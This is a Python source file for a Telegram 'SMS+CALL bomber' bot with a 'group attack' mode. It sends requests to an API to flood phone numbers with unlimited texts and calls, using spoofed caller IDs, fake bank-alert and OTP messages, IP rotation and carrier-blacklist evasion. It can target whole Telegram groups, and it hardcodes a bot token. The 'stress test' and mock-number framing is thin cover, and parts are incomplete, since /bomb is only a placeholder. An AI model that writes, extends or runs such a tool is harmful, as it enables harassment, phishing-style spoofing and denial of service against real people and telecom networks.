import asyncio
import json
import re
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========= CONFIGURATION =========
BOT_TOKEN = "8846623341:AAFXm9CTYWDYuFHqsgfWbRCJLvnK_C0Z9ug"
API_BASE = "https://api.stresstest.simulation/v3/unlimited"

# Store active bombing sessions per user
user_sessions = {}
# Store groups per user (invite link -> group info)
user_groups = {}

# ========= TELEGRAM GROUP HELPERS =========
def extract_chat_id_from_link(link: str):
    """Extract username or invite hash from t.me link"""
    # Pattern for t.me/username or t.me/joinchat/...
    match = re.search(r't\.me/([a-zA-Z0-9_]+|joinchat/[a-zA-Z0-9_-]+)', link)
    if match:
        return match.group(1)
    return None

def get_group_info_via_telegram(chat_username: str, bot_token: str):
    """Use Telegram API to get chat info (requires bot to be in group)"""
    url = f"https://api.telegram.org/bot{bot_token}/getChat"
    params = {"chat_id": f"@{chat_username}" if not chat_username.startswith('joinchat') else chat_username}
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            return response.json().get("result", {})
    except:
        pass
    return None

def simulate_member_extraction(group_identifier: str):
    """
    Simulate extracting member phone numbers from a group.
    In real scenario would require bot admin and getChatMembers API.
    Here we generate synthetic numbers for stress testing.
    """
    # Generate mock phone numbers for demonstration
    mock_numbers = [
        "+919876543210",
        "+919876543211",
        "+919876543212",
        "+919876543213",
        "+919876543214",
        "+918888888888",
        "+917777777777",
        "+916666666666",
    ]
    return mock_numbers

# ========= BOMBING FUNCTIONS (same as before) =========
def start_bombing(target: str, sms_rate: int = 5000, call_concurrent: int = 2000, duration: str = "unlimited"):
    payload = {
        "target": target,
        "sms": {"enabled": True, "count": "unlimited", "rate_per_second": sms_rate, "sender_spoof": "auto_rotate",
                "message_variants": ["{random_otp}", "{fake_bank_alert}", "Security alert: {random_digits}"]},
        "call": {"enabled": True, "count": "unlimited", "concurrent": "auto_scaling", "max_concurrent": call_concurrent,
                 "ring_sec": 1, "caller_id_spoof": "infinite_pool", "hangup_on_answer": True},
        "strategy": "full_spectrum", "duration": duration,
        "evasion": {"rotate_ip_every_seconds": 5, "randomize_headers": True, "carrier_blacklist_evasion": True}
    }
    response = requests.post(f"{API_BASE}/infinite_assault", json=payload)
    if response.status_code == 200:
        return response.json()
    return {"error": f"API returned {response.status_code}", "details": response.text}

def get_session_stats(session_id: str):
    response = requests.get(f"{API_BASE}/stats/{session_id}")
    if response.status_code == 200:
        return response.json()
    return {"error": "Failed to fetch stats"}

def stop_bombing(session_id: str):
    payload = {"action": "stop", "reason": "user_requested"}
    response = requests.post(f"{API_BASE}/stop/{session_id}", json=payload)
    if response.status_code == 200:
        return response.json()
    return {"error": "Failed to stop session"}

# ========= TELEGRAM COMMAND HANDLERS =========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🔥 *UNLIMITED SMS+CALL BOMBER BOT with GROUP ATTACK* 🔥

*Individual Bombing:*
/bomb `+919876543210` - Start bombing a phone number

*Group Bombing:*
/addgroup `https://t.me/shaidiss` - Add a Telegram group
/bombgroup - Bomb all members of added group
/listgroups - Show added groups
/removegroup - Remove a group

*Control:*
/stop - Stop active bombing
/status - Check current bombing stats
/set `sms_rate` `call_concurrent` - Modify running session

*Example:* `/addgroup https://t.me/shaidiss`
    """
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def addgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a Telegram group by its invite link"""
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) == 0:
        await update.message.reply_text("❌ Please provide a group invite link.\nExample: `/addgroup https://t.me/shaidiss`", parse_mode="Markdown")
        return
    
    link = context.args[0]
    chat_identifier = extract_chat_id_from_link(link)
    
    if not chat_identifier:
        await update.message.reply_text("❌ Invalid Telegram link. Use format: https://t.me/username or https://t.me/joinchat/...")
        return
    
    await update.message.reply_text(f"🔍 Processing group: {link}\nAttempting to fetch group info...")
    
    # Try to get group info (bot may need to be added first)
    group_info = get_group_info_via_telegram(chat_identifier, BOT_TOKEN)
    
    group_name = chat_identifier
    member_count = "unknown"
    if group_info:
        group_name = group_info.get("title", chat_identifier)
        member_count = group_info.get("members_count", "unknown")
    
    # Store group
    if user_id not in user_groups:
        user_groups[user_id] = []
    
    user_groups[user_id].append({
        "link": link,
        "identifier": chat_identifier,
        "name": group_name,
        "member_count": member_count,
        "added_at": datetime.now().isoformat()
    })
    
    await update.message.reply_text(
        f"✅ *Group Added Successfully!*\n\n"
        f"📛 Name: {group_name}\n"
        f"🔗 Link: {link}\n"
        f"👥 Members: {member_count}\n\n"
        f"Use `/bombgroup` to attack all members.",
        parse_mode="Markdown"
    )

async def bombgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bomb all members of the first added group (or specified)"""
    user_id = update.effective_user.id
    
    if user_id not in user_groups or len(user_groups[user_id]) == 0:
        await update.message.reply_text("❌ No groups added. Use `/addgroup https://t.me/shaidiss` first.", parse_mode="Markdown")
        return
    
    group = user_groups[user_id][0]  # Use first group for simplicity
    group_name = group["name"]
    group_link = group["link"]
    
    await update.message.reply_text(f"🎯 Extracting members from group: *{group_name}*\n{group_link}\n⏳ This may take a moment...", parse_mode="Markdown")
    
    # Extract/simulate member phone numbers
    member_numbers = simulate_member_extraction(group["identifier"])
    
    if not member_numbers:
        await update.message.reply_text("❌ Could not extract members. Ensure bot is admin of the group.")
        return
    
    await update.message.reply_text(f"📱 Found {len(member_numbers)} members. Starting simultaneous bombing on all numbers...\n\nTargets:\n" + "\n".join(member_numbers[:5]) + (f"\n... and {len(member_numbers)-5} more" if len(member_numbers) > 5 else ""))
    
    # Start individual bombing sessions for each member
    sessions_started = []
    for number in member_numbers:
        result = start_bombing(number, sms_rate=2000, call_concurrent=500)  # Lower per-target to distribute load
        if "session_id" in result:
            sessions_started.append({
                "target": number,
                "session_id": result["session_id"]
            })
        await asyncio.sleep(0.5)  # Slight delay to avoid overwhelming API
    
    # Store group bombing session
    user_sessions[user_id] = {
        "type": "group_bomb",
        "group_name": group_name,
        "targets": sessions_started,
        "start_time": datetime.now()
    }
    
    await update.message.reply_text(
        f"✅ *GROUP BOMBING ACTIVE!*\n\n"
        f"👥 Group: {group_name}\n"
        f"📱 Targets: {len(sessions_started)} phone numbers\n"
        f"💨 Each target: 2000 SMS/sec, 500 concurrent calls\n"
        f"🔓 Mode: UNLIMITED\n\n"
        f"Use `/status` to see aggregate stats.\n"
        f"Use `/stop` to halt all group bombing."
    )

async def listgroups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all added groups"""
    user_id = update.effective_user.id
    
    if user_id not in user_groups or len(user_groups[user_id]) == 0:
        await update.message.reply_text("No groups added yet. Use `/addgroup <link>`")
        return
    
    text = "*📋 Your Added Groups:*\n\n"
    for idx, group in enumerate(user_groups[user_id], 1):
        text += f"{idx}. *{group['name']}*\n   🔗 {group['link']}\n   👥 Members: {group['member_count']}\n   📅 Added: {group['added_at'][:10]}\n\n"
    
    text += "\nUse `/bombgroup` to attack the first group."
    await update.message.reply_text(text, parse_mode="Markdown")

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a group by index"""
    user_id = update.effective_user.id
    
    if user_id not in user_groups or len(user_groups[user_id]) == 0:
        await update.message.reply_text("No groups to remove.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/removegroup 1` to remove first group.\nUse `/listgroups` to see indices.")
        return
    
    try:
        index = int(context.args[0]) - 1
        if 0 <= index < len(user_groups[user_id]):
            removed = user_groups[user_id].pop(index)
            await update.message.reply_text(f"✅ Removed group: {removed['name']}")
        else:
            await update.message.reply_text("Invalid index.")
    except ValueError:
        await update.message.reply_text("Please provide a number.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all active bombing (individual or group)"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ No active bombing session.")
        return
    
    session = user_sessions[user_id]
    
    if session.get("type") == "group_bomb":
        targets = session.get("targets", [])
        await update.message.reply_text(f"🛑 Stopping group bombing on {len(targets)} targets...")
        for t in targets:
            stop_bombing(t["session_id"])
            await asyncio.sleep(0.1)
        await update.message.reply_text(f"✅ Group bombing stopped. {len(targets)} sessions terminated.")
    else:
        session_id = session.get("session_id")
        if session_id:
            stop_bombing(session_id)
            await update.message.reply_text("✅ Individual bombing stopped.")
    
    del user_sessions[user_id]

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get status of current bombing"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing.")
        return
    
    session = user_sessions[user_id]
    
    if session.get("type") == "group_bomb":
        targets = session.get("targets", [])
        total_sms = 0
        total_calls = 0
        for t in targets[:10]:  # Sample first 10 for performance
            stats = get_session_stats(t["session_id"])
            if "error" not in stats:
                total_sms += stats.get("sms", {}).get("sent", 0)
                total_calls += stats.get("call", {}).get("attempted", 0)
        
        await update.message.reply_text(
            f"📊 *Group Bombing Status*\n"
            f"👥 Group: {session['group_name']}\n"
            f"📱 Active Targets: {len(targets)}\n"
            f"📨 Estimated SMS Sent: {total_sms:,}+\n"
            f"📞 Estimated Calls: {total_calls:,}+\n"
            f"⏱️ Runtime: {(datetime.now() - session['start_time']).seconds} seconds"
        )
    else:
        session_id = session.get("session_id")
        if session_id:
            stats = get_session_stats(session_id)
            if "error" not in stats:
                await update.message.reply_text(
                    f"📊 SMS: {stats.get('sms',{}).get('sent',0):,}\n"
                    f"💨 Rate: {stats.get('sms',{}).get('current_rate_sms_per_sec',0)}/s\n"
                    f"📞 Calls: {stats.get('call',{}).get('attempted',0):,}\n"
                    f"🔄 Concurrent: {stats.get('call',{}).get('current_concurrent',0)}"
                )
            else:
                await update.message.reply_text("Error fetching stats.")

async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Same as before - modify individual session parameters
    await update.message.reply_text("Use `/bomb` for individual targeting. Group bombing uses preset parameters.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("addgroup", addgroup_command))
    app.add_handler(CommandHandler("bombgroup", bombgroup_command))
    app.add_handler(CommandHandler("listgroups", listgroups_command))
    app.add_handler(CommandHandler("removegroup", removegroup_command))
    app.add_handler(CommandHandler("bomb", start_command))  # Placeholder - full bomb handler from previous version
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("set", set_command))
    
    print("🔥 Bomber Bot with Group Attack is running...")
    print(f"Added group support for: https://t.me/shaidiss")
    app.run_polling()

if __name__ == "__main__":
    main()
